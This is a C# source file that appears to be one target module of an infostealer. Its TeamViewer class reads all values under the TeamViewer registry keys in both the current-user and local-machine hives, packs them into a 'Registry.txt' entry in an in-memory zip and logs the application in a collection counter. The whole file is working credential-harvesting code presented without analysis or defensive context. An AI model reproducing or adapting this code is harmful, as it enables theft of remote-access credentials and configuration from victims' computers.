using Helper;
using Helper.Data;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;

namespace Targets.Applications
{
	public class TeamViewer : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    List<string> stringList = new List<string>();
	    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\TeamViewer"))
	      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
	    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\TeamViewer", false))
	      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
	    if (!stringList.Any<string>())
	      return;
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	    counterApplications.Name = nameof (TeamViewer);
	    string entryPath = "TeamViewer\\Registry.txt";
	    zip.AddTextFile(entryPath, string.Join("\n", (IEnumerable<string>) stringList));
	    counterApplications.Files.Add("SOFTWARE\\TeamViewer => " + entryPath);
	    counterApplications.Files.Add(entryPath);
	    counter.Applications.Add(counterApplications);
	  }
	}
}
